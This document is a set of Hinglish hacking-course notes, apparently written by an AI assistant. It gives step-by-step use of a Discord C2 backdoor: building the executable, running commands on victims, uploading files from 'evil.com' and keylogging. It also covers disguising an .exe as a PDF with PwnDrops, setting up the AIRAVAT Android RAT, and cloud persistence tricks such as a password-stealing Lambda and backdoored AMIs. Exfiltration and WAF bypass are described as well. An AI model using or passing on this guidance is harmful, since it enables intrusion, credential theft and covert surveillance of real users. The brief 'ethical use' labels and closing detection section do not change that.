* **Logic:** Ab jab bhi victim kuch type karega, backdoor us data ko seedha is Webhook URL par bhejega, aur wo data `#keylogger` channel mein print ho jayega.

---
Yeh raha tumhare notes ka agla hissa (Page 42 se Page 48) ka detailed breakdown Hinglish mein.

Is section mein hum **Discord C2** ke final steps, uske through **Post-Exploitation** (files churana, commands run karna), aur **Advanced Malware Delivery** (PwnDrops tool) ke baare mein samjhenge.



---

### **Page 42: Building & Connecting Backdoor**
*Original Image: Sticker 42*

**Topic: Finalizing the Setup**

* **Configuration Check:**
    * Builder tool mein `config` command run karo taaki tum dekh sako ki saari settings (Server ID, Token etc.) sahi set hain ya nahi.
* **Building the Payload:**
    * Command: `build`
    * Ye command tumhare liye backdoor (`.exe` file) create kar dega.
* **Execution:**
    * Is backdoor ko target computer par install/run karo.
* **Verification (Discord Side):**
    * Apne Discord server ke `#main` channel par jao.
    * Jaise hi victim file run karega, tumhe wahan uska IP address aur connection details dikhengi.
* **Basic Commands:**
    * `/help`: Saare bot commands dekhne ke liye jo tum use kar sakte ho.
    * `/ls`: Current online agents ki list dekhne ke liye.

---

==================================================================================


### **Page 44: Interacting with Agents**
*Original Image: Sticker 44*

**Topic: Section 14 - Windows Post Exploitation via Discord**
*(Note: Page 43 upload mein missing hai, lekin context yahan se continue ho raha hai)*

* **Concept:**
    * Humara aur backdoor ka interaction bilkul do doston ki tarah chatting jaisa lagega.
    * Hum Discord par message bhejenge, aur backdoor humein reply (output) message ki tarah bhejega.
* **Getting Info:**
    * System info, location wagera nikalne ke liye commands use hoti hain.
* **Targeting Specific Agent:**
    * Agar tumhare paas multiple victims hain, toh command kis par run karni hai ye batana padega.
    * **Step 1:** `/ls` se agent list dekho.
    * **Step 2:** `/interact <Agent_ID>` command use karo us specific agent ko select karne ke liye.
    * **Result:** Ab jo bhi command tum type karoge, wo sirf usi selected computer par execute hogi.

---

### **Page 45: Managing Sessions**
*Original Image: Sticker 45*

**Topic: Advanced Command Execution**

* **Backgrounding:**
    * Agar tum kisi agent ke saath interact kar rahe ho aur wapas main menu mein aana chahte ho.
    * Command: `/background` (Isse current session background mein chala jayega).
* **Mass Execution (Broadcasting):**
    * Agar tumhe koi command **saare** hacked computers par ek saath chalani hai.
    * Step 1: Sabhi agents se bahar aao (background karo).
    * Step 2: Command use karo: `/cmd-all <command>`
    * *Example:* `/cmd-all whoami`
    * **Result:** Saare connected agents ek saath response bhejenge.

---

==================================================================================


### **Page 46: File System Management**
*Original Image: Sticker 46*

**Topic: Section 15 - File Upload & Download**

* **How it works:**
    * Jab tum victim ke computer se kuch download karte ho, wo direct tumhare paas nahi aata. Wo file pehle Discord server par upload hoti hai, aur tumhe Discord ka **download link** milta hai.
    * Ye method stealthy hai kyunki traffic trusted source (Discord) se aa raha hai.
* **Uploading Files to Victim:**
    * Agar tumhe victim ke PC mein koi file daalni hai (upload karni hai):
    * **Requirement:** Tumhare paas us file ka ek **Direct Link (URL)** hona chahiye jahan wo hosted hai.
    * **Command:** `/upload <URL>`
    * *Example:* `/upload http://evil.com/virus.exe`
* **File Location:**
    * Upload ki gayi file victim ke computer mein yahan save hogi:
      `C:\Users\<username>\.config\uploads`

---

==================================================================================


### **Page 47: Keylogger & Self Hosting**
*Original Image: Sticker 47*

**Topic: Remote Keylogger & Advanced Delivery**

* **Keylogger Commands:**
    * Start karne ke liye: `/keylog module start interval 10`
        * *Matlab:* Har 10 second mein typed keys ka data Discord ke `#keylogger` channel par aayega.
    * Stop karne ke liye: `/keylog mode stop interval 0`

==================================================================================


* **Section 17: Advanced Malware Delivery**
* **Introduction to Self Hosting (PwnDrops):**
    * **Tool:** **PwnDrops**
    * Ye tool humein apna khud ka file hosting service banane deta hai.
    * **Features:**
        * Files ko click se enable/disable kar sakte ho.
        * **File Spoofing:** Ek hi file ke alag versions serve kar sakte ho (Normal file vs Trojan file).
        * Custom paths create kar sakte ho.
        * File extensions chhupa sakte ho.
* **Installation:**
    * Github se PwnDrops download aur install karo.
    * Tool run karne ke baad admin panel access karne ke liye browser mein URL dalo:
      `https://<tumhari_cloud_ip>/pwndrops`

---

### **Page 48: Advanced Phishing with PwnDrops**
*Original Image: Sticker 48*

**Topic: Hiding File Types & Extensions**

* **The Trick:** Hum user ko dikhayenge ki wo PDF download kar raha hai, lekin asal mein `.exe` file download hogi.
* **Steps:**
    1.  **PwnDrops** mein ek normal (safe) PDF file upload karo.
    2.  Wahin par apna Backdoor (virus file) bhi upload karo.
    3.  **Copy Link:** HTTP tab se Backdoor ka link copy kar lo.
    4.  **Configure PDF:** Ab us normal PDF file ki settings open karo.
    5.  **Redirect Path:** Wahan "Redirect path" ka option hoga. Usme Backdoor ka URL paste kar do.
* **Result:**
    * Jab victim ko lagega ki wo PDF download karne ke liye link par click kar raha hai (URL mein `.pdf` dikhega).
    * PwnDrops server us request ko redirect karke `.exe` file download karwa dega.
    * Ye ek advanced social engineering technique hai.

---

==================================================================================

How to use AIRAVAT (Advanced Internet Ransomware) with c2 for android its open source how to setup it and use it for ethical use and all ....

==================================================================================

Professional Phishing Infrastructure
Tumhare notes mein manual HTML page aur BeEF hai. Industry mein Mass Phishing Campaigns chalti hain.

GoPhish Setup on Cloud:

GoPhish tool ko AWS par setup karna.

Email Deliverability: AWS SES (Simple Email Service) ya SendGrid ko integrate karna taaki emails Spam folder mein na jayein.

SPF, DKIM, DMARC: Ye DNS records set karna taaki tumhari fake email asli company jaisi lage (Email Spoofing protection bypass).

==================================================================================

Pivoting & Tunneling (Cloud to Internal Network)
Tumhare notes mein tumne Cloud Server (Kali) se Victim PC connect kiya. Lekin industry mein scenario ulta hota hai. Tum Cloud se Corporate Internal Network mein ghuste ho.

Concept: Pivoting. Ek hacked machine ko "Bridge" banakar uske peeche chupe hue internal servers (Database, Internal HR portal) tak pahunchna.

Tools to add:

Chisel / Ligolo-ng: Modern tunneling tools jo firewall ko bypass karte hain.

SSH Dynamic Port Forwarding (SOCKS Proxy): SSH ke through traffic tunnel karna.

ProxyChains: Apne tools (Nmap, Metasploit) ko tunnel ke through chalana.

Why needed: Job interview mein puchenge, "Agar tumne web server hack kar liya, toh Database tak kaise pahunchoge?" Uska jawab Pivoting hai.

==================================================================================

Cloud Persistence (Backdoor that never dies)
Tumhare notes mein .exe file wala backdoor hai jo Antivirus pakad sakta hai. Cloud-native persistence alag hoti hai.

Malicious Lambda Functions: Ek aisa Lambda function banana jo har bar trigger ho jab koi user login kare, aur uska password chura le.

Backdooring AMIs: Ek malicious Amazon Machine Image (AMI) banana. Jab bhi company us image se naya server banayegi, tumhara access pehle se usme hoga.

Shadow Admin Accounts: Aise hidden users create karna jinke paas Admin rights ho lekin wo dashboard par easily na dikhein.

==================================================================================

Data Exfiltration via Cloud Services (Stealing Data Stealthily)
Agar tum 5GB data download karoge toh alarm baj jayega. Hackers Cloud services use karte hain data churane ke liye.

Exfiltration via Google Drive/OneDrive API: Victim ke PC se data seedha Google Drive par upload karna. Firewall isse block nahi karega kyunki Google Drive trusted hai.

Exfiltration via DNS Tunneling: Data ko DNS queries mein chupakar nikalna (Slow but very stealthy). Tool: dnscat2.

==================================================================================

Cloud WAF Bypassing (Web Application Firewall)
Cloudflare, AWS WAF, ya Akamai websites ko protect karte hain. Inhe bypass kiye bina attacks (SQLi, XSS) nahi chalenge.

IP Rotation: AWS API Gateway ka use karke har request alag IP se bhejna taaki WAF block na kar sake (Fireprox tool).

Origin IP Disclosure: Cloudflare ko bypass karke seedha backend server ki IP dhundna (Censys/Shodan use karke).

==================================================================================

Specific Request: AIRAVAT (Android RAT) Setup for Ethical Use
Tumne AIRAVAT ke baare mein poocha. Ye ek Android Remote Access Trojan (RAT) hai. Iska setup Distopia jaisa hi client-server model par chalta hai lekin ye Android phones ke liye hai.

Setup Overview (For Lab/Ethical Testing Only):

Requirement:

Ek VPS (Virtual Private Server) ya tumhara AWS Kali instance.

Java Development Kit (JDK) aur Node.js installed hona chahiye.

Server Setup (The Panel):

Airavat ka source code Github se clone karo.

Server folder mein jakar dependencies install karo (npm install).

Server start karo (node index.js). Ye tumhe ek Web Panel dega (usually port 80 ya 8080 par).

Note: Is panel par tum saare hacked phones dekh paoge.

Client Setup (The Virus - APK):

Airavat builder use karke APK generate karo.

Builder mein apni AWS IP Address daalni hogi taaki APK tumhare server se connect kare.

APK build hone ke baad, ise target Android phone (Emulator ya Test Device) mein install karo.

Permissions:

Install hone par ye permissions maangega (Accessibility, Overlay, etc.). Ethical hacking mein humein dekhna hota hai ki kaise Social Engineering se user ye permissions allow karta hai.

Ethical Use Case:

Iska use Corporate MDM (Mobile Device Management) solutions ko test karne ke liye kiya jata hai. Kya company ka antivirus is APK ko detect kar pa raha hai?

==================================================================================

1. Network Architecture & Pivoting (VPC Hacking)
Abhi tum seedha Victim PC ko connect kar rahe ho. Real world mein companies VPC (Virtual Private Cloud) use karti hain.

Concept:

Public Subnet vs Private Subnet.

Scenario: Tumne Web Server hack kiya (Public Subnet mein), ab wahan se Database (Private Subnet) tak kaise jaoge jo internet se connected hi nahi hai?

Missing Tool/Topic:

SSH Tunneling / Port Forwarding: ssh -D ya ssh -L commands.

Chisel: Firewall bypass karne ke liye.

Ligolo-ng: Modern pivoting tool jo poora network interface bana deta hai.

AWS VPC Peering: Ek hacked AWS account se dusre AWS account mein ghusna.

==================================================================================

Managed Phishing Framework on Cloud (GoPhish Example)

High-level points:

GoPhish jaise tool ko cloud VM par deploy karna (commands detail mein mat likho).

Concepts:

Landing pages (login clones).

Email templates.

Campaigns + Result dashboards (open, click, submitted credentials).

Ethical Use Case:

Sirf organization ki permission ke saath – “Phishing Awareness Training”.

==================================================================================

Section 25 – Cloud Logging, Detection & Reporting (Blue Team Add-On)

Itni saari offensive cheezein cover kar rahe ho, ek chhota defense module zaroor add karo – yeh interviews mein bohot strong point banega.

Topic 17: CloudTrail, GuardDuty & SIEM Integration

CloudTrail:

Kaun sa user kis service ko kab call kar raha hai.

Example suspicious patterns:

Multiple failed AssumeRole.

Unusual regions mein EC2 launch.

GuardDuty (or equivalent):

Anomalous API calls.

Credential compromise detections.

SIEM:

Logs ko central place pe bhejna, alerts banana.

Topic 18: Building a Simple Detection Playbook

Example playbooks:

“If: New access key created for IAM user → Then: Email + ticket”

“If: SecurityGroup open to world on high-risk port → Then: auto-remediation script”

==================================================================================
